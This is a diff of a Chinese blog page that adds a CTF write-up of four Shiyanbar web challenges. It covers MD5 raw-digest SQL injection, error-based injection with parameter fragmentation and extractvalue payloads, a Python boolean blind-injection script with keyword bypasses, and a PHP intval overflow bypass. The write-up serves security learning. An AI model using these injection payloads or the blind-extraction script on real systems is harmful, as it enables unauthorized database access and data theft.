@@ -96,10 +96,17 @@
 <meta property="og:site_name" content="煊奕">
 <meta property="og:description" content="成长的痛苦，远比后悔的痛苦好">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-01T15:55:44.987Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/16/AxJCes.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/16/AxJ3Y6.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/16/AxtQG6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/16/AxQX7V.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/16/Axl5Hx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/16/AxnjRs.png">
+<meta property="og:updated_time" content="2019-04-16T15:04:05.563Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="实验吧Web记录">
 <meta name="twitter:description" content="成长的痛苦，远比后悔的痛苦好">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/16/AxJCes.png">
 
 
 
@@ -367,7 +374,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  13
+                  1.9k
                 </span>
               
 
@@ -395,6 +402,53 @@
         <blockquote class="blockquote-center">成长的痛苦，远比后悔的痛苦好</blockquote>
 
 <a id="more"></a>
+<h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>1.查看源码，发现以下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">	<span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">	&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>2.刚开始想着直接万能语句来着，后来发现不行。mysql中的运算优先级为：not&gt;and&gt;or 万能语句绕不过的，这题主要考md5生成摘要构成语句注入。</p>
+<p><img src="https://s2.ax1x.com/2019/04/16/AxJCes.png" alt></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php进行MD5加密时生成不同长度的方法，有true则为16位</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"MD5加密ffifdyop生成的16字符消息摘要为--&gt;"</span>.<span class="string">""</span>.md5(<span class="string">'ffifdyop'</span>, <span class="keyword">true</span>).<span class="string">""</span>,<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"MD5加密ffifdyop生成的32字符消息摘要为--&gt;"</span>.<span class="string">""</span>.md5(<span class="string">'ffifdyop'</span>).<span class="string">""</span>,<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果为：</p>
+<p><img src="https://s2.ax1x.com/2019/04/16/AxJ3Y6.md.png" alt></p>
+<p>3.由结果可知，语句变为<code>SELECT * FROM admin WHERE pass=&#39; &#39;or &#39;6&lt;*****&gt;&#39;</code> 其中<code>&lt;*****&gt;</code>不必管，条件即为真，所以可绕过。相当于<code>select * from users where username=&#39;admin&#39; and password=&#39;&#39;or&#39;6fsfdsgfdsgsdg&#39;;</code>恒为真，如图</p>
+<p><img src="https://s2.ax1x.com/2019/04/16/AxtQG6.png" alt></p>
+<hr>
+<h3 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h3><p>1.查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tips:post username and password...</span></span><br><span class="line"> $sql=<span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure>
+<p>2.试了不少，还是没头绪，看writeup，发现又是一种新方式。实验吧的题很强啊(哭)</p>
+<p>3.有两种解法<br>方法一：HPF(http parameter fragment)<br>主要是用/**/构造语句注入，如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">看版本</span><br><span class="line">username=<span class="string">' and extractvalue/*&amp;password=1*/(1,concat('</span>~<span class="string">',(select version())))or'</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">查看数据库名 error_based_hpf</span><br><span class="line">username=<span class="string">' and extractvalue/*&amp;password=1*/(1,concat('</span>~<span class="string">',(select database())))or'</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">查表名 ffll44jj,users</span><br><span class="line">username=<span class="string">' and extractvalue/*&amp;password=1*/(1,concat('</span>~<span class="string">',(select group_concat(table_name) from information_schema.tables where table_schema regexp database())))or'</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查列名 id,username,password</span></span><br><span class="line"><span class="comment"># username=' and extractvalue/*&amp;password=1*/(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name regexp 'users')))or'1</span></span><br><span class="line"><span class="comment"># 表名用16形式进制代替</span></span><br><span class="line"><span class="comment"># #username=' and extractvalue/*&amp;password=1*/(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name regexp 0x7573657273)))or'1</span></span><br><span class="line"></span><br><span class="line">是这个 value（表ffll44jj的字段）</span><br><span class="line">username=<span class="string">' and extractvalue/*&amp;password=1*/(1,concat('</span>~<span class="string">',(select group_concat(column_name) from information_schema.columns where table_name regexp 0x66666c6c34346a6a)))or'</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">查内容</span><br><span class="line">username=<span class="string">' and extractvalue/*&amp;password=1*/(1,concat('</span>~<span class="string">',(select group_concat(value) from ffll44jj)))or'</span><span class="number">1</span></span><br><span class="line">flag&#123;err0r_b4sed_sqli_+_hpf&#125;</span><br></pre></td></tr></table></figure>
+<p>方法二：exp()报错注入<br>因为没有过滤exp()函数，所以可以利用。<a href="http://drops.xmd5.com/static/drops/tips-8166.html" target="_blank" rel="noopener">关于exp()溢出报错注入</a></p>
+<hr>
+<h3 id="认真一点"><a href="#认真一点" class="headerlink" title="认真一点"></a>认真一点</h3><p>1.此题有很多坑，总结的话，最应该注意的还是注意每一个细节（有三种反馈信息）之前没管它，模糊测试后，试到怀疑人生。</p>
+<ul>
+<li><code>You are in ................</code> 正常输入且成功</li>
+<li><code>You are not in ...............</code> 输入后不成功（在后台删去某些字符串）</li>
+<li><code>Sql injection detected!</code> 检测到并且过滤掉的字符串</li>
+</ul>
+<p>2.这个肯定是要盲注的，下面是代码。<br>这里有一个需要注意的，请关掉代码格式自动调整，因为会自动加上空格导致跑不出来。</p>
+<p>3.这个题一个很坑的地方是有的字符串它直接去掉，然后显示的是<code>You are not in ...............</code> 所以构造时，需要双写绕过，比如<code>or</code>要写为<code>oorr</code>。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'You are in'</span></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/earnest/index.php'</span></span><br><span class="line">allString = string.printable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库长度</span></span><br><span class="line"><span class="comment"># for i in range(1, 20):</span></span><br><span class="line"><span class="comment"># 	key = &#123;'id':"0'oorr(length(database())=%s)oorr'0"%i&#125;</span></span><br><span class="line"><span class="comment"># 	r = requests.post(url, data=key)</span></span><br><span class="line"><span class="comment"># 	print(i)</span></span><br><span class="line"><span class="comment"># 	if str1 in r.text:</span></span><br><span class="line"><span class="comment"># 		print('数据库名长度为：', i)</span></span><br><span class="line"><span class="comment"># 		break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名称 ctf_sql_bool_blind</span></span><br><span class="line"><span class="comment"># 这里直接报内容，需要把长度设置合理一点，然后观察结果即可</span></span><br><span class="line"><span class="comment"># database_name = ""</span></span><br><span class="line"><span class="comment"># for i in range(1, 19):</span></span><br><span class="line"><span class="comment"># 	for ch in allString:</span></span><br><span class="line"><span class="comment"># 		key = &#123;'id':"0'oorr(mid(database()from(%d)foorr(1))='%s')oorr'0" % (i,ch)&#125;</span></span><br><span class="line"><span class="comment"># 		# 太慢了，在这里加一个输出，好然自己了解运行情况和payload的内容</span></span><br><span class="line"><span class="comment"># 		# print(key)</span></span><br><span class="line"><span class="comment"># 		r = requests.post(url, data = key)</span></span><br><span class="line"><span class="comment"># 		if str1 in r.text:</span></span><br><span class="line"><span class="comment"># 			print('第%d个字符为：'%i,ch)</span></span><br><span class="line"><span class="comment"># 			database_name += ch</span></span><br><span class="line"><span class="comment"># 			break</span></span><br><span class="line"><span class="comment"># 	print(database_name)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 表名 fiag,users</span></span><br><span class="line"><span class="comment"># tableName = ""</span></span><br><span class="line"><span class="comment"># for i in range(1,20):</span></span><br><span class="line"><span class="comment"># 	for ch in allString:</span></span><br><span class="line"><span class="comment"># 		key1 = "0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%d)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='%c')oorr'0"%(i, ch)</span></span><br><span class="line"><span class="comment"># 		key2 = key1.replace(' ', chr(0x0a))</span></span><br><span class="line"><span class="comment"># 		key = &#123;'id':key2&#125;</span></span><br><span class="line"><span class="comment"># 		# print(key)</span></span><br><span class="line"><span class="comment"># 		r = requests.post(url, data = key)</span></span><br><span class="line"><span class="comment"># 		if str1 in r.text:</span></span><br><span class="line"><span class="comment"># 			print('第%d个字符为：'%i,ch)</span></span><br><span class="line"><span class="comment"># 			tableName += ch</span></span><br><span class="line"><span class="comment"># 			break</span></span><br><span class="line"><span class="comment"># 	print(tableName)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 列名 fl$4g</span></span><br><span class="line"><span class="comment"># columnName = ""</span></span><br><span class="line"><span class="comment"># for i in range(1,20):</span></span><br><span class="line"><span class="comment"># 	for ch in allString:</span></span><br><span class="line"><span class="comment"># 		key1 = "0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%d)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='%c')oorr'0"%(i, ch)</span></span><br><span class="line"><span class="comment"># 		key2 = key1.replace(' ', chr(0x0a))</span></span><br><span class="line"><span class="comment"># 		key = &#123;'id':key2&#125;</span></span><br><span class="line"><span class="comment"># 		#print(key)</span></span><br><span class="line"><span class="comment"># 		r = requests.post(url, data = key)</span></span><br><span class="line"><span class="comment"># 		if str1 in r.text:</span></span><br><span class="line"><span class="comment"># 			print('第%d个字符为：'%i,ch)</span></span><br><span class="line"><span class="comment"># 			columnName += ch</span></span><br><span class="line"><span class="comment"># 			break</span></span><br><span class="line"><span class="comment"># 	print(columnName)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line"><span class="comment"># 这里空格打印不出来空格，会被转义为*</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">	<span class="keyword">for</span> ch <span class="keyword">in</span> allString:</span><br><span class="line">		key1 = <span class="string">"0'oorr((select(mid((fl$4g)from(%d)foorr(1)))from(fiag))='%c')oorr'0"</span>%(i, ch)    </span><br><span class="line">		key2 = key1.replace(<span class="string">' '</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line">		key = &#123;<span class="string">'id'</span>:key2&#125;</span><br><span class="line">		print(key)</span><br><span class="line">		r = requests.post(url, data = key)</span><br><span class="line">		<span class="keyword">if</span> str1 <span class="keyword">in</span> r.text:</span><br><span class="line">			print(<span class="string">'第%d个字符为：'</span>%i,ch)</span><br><span class="line">			flag += ch</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="你真的会php吗"><a href="#你真的会php吗" class="headerlink" title="你真的会php吗"></a>你真的会php吗</h3><p>1.看到题目，八成是代码审计的题，看来又得慢慢查了。产看源码无果后，再看看响应头，发现有个txt文件。</p>
+<p><img src="https://s2.ax1x.com/2019/04/16/AxQX7V.png" alt></p>
+<p>2.访问得到源码（下面的源码是自己添加注释后的，方便观看）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123; <span class="comment">//不传参数则会在响应头中有hint</span></span><br><span class="line">   header(<span class="string">"hint:6c525af454059b4fe7d8c33a.txt"</span>);</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); <span class="comment">//trim() 函数移除字符串两侧的空白字符或其他预定义字符</span></span><br><span class="line">        <span class="comment">// 注意：trim()并不能去除已经编码的空字符（如%00,%20）所以下面可以通过加上此内容绕过数字检验</span></span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123; <span class="comment">//判断输入的数是否是一个回文数</span></span><br><span class="line">    $number = strval($number); <span class="comment">//将数组及类之外的变量类型转换成字符串类型</span></span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123; </span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123; </span><br><span class="line">  <span class="comment">//不能是数字</span></span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line">    <span class="comment">//输入的值要与其取整后相等，才能绕过此处。</span></span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>])); <span class="comment">//strrev() 函数反转字符串 </span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123; <span class="comment">//这里需要是回文数</span></span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//这里又不可以是回文数</span></span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br></pre></td></tr></table></figure>
+<p>3.可以看到，此题有点变态，在这再进一步描述一下几个函数。<br>(1)<code>intval()函数：</code>用于获取变量的整数值。语法为：<code>int intval ( mixed $var [, int $base = 10 ] )</code></p>
+<ul>
+<li><p><code>intval()</code> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 <code>intval()</code>不能用于 object，否则会产生 <code>E_NOTICE</code> 错误并返回 1。</p>
+</li>
+<li><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p>
+</li>
+<li>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 <code>-2147483648</code> 到 <code>2147483647</code>。<br><img src="https://s2.ax1x.com/2019/04/16/Axl5Hx.png" alt></li>
+<li>64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br><img src="https://s2.ax1x.com/2019/04/16/AxnjRs.png" alt></li>
+<li>字符串有可能返回 0，虽然取决于字符串最左侧的字符。</li>
+</ul>
+<p>(2)其他函数：其实大部分函数从字面上都可以看出其功能，主要是不清楚其是否存在可用的漏洞。这里主要利用了<code>intval()</code>函数存在的漏洞。</p>
+<p>4.解题方法</p>
+<p>方法一：利用intval溢出<br>32位机最大值<code>2^31-1=2147483647</code>，反转后为<code>7463847412</code>，但是已经溢出，所以会自动变成<code>2147483647</code>，根据源码分析可知，<code>number=2147483647%20</code>可行。<br>方法二：<br>第二个思想可以直接使用<code>-0%20</code>，就不多说了，根据源码走一遍，加深理解。</p>
+<p>注：加上%20是因为输入不可为数值，而且<code>intval()</code>会自动忽略。</p>
+<p>5.任意提交上面一个，即可得出flag。</p>
+<p>### </p>
 <hr>
 
       
@@ -508,8 +562,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -526,7 +589,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -537,7 +600,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -548,7 +611,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -633,6 +696,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#后台登录"><span class="nav-number">1.</span> <span class="nav-text">后台登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加了料的报错注入"><span class="nav-number">2.</span> <span class="nav-text">加了料的报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#认真一点"><span class="nav-number">3.</span> <span class="nav-text">认真一点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#你真的会php吗"><span class="nav-number">4.</span> <span class="nav-text">你真的会php吗</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -661,7 +740,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">53.1k</span>
+    <span title="Site words total count">67k</span>
   
 </div>
 
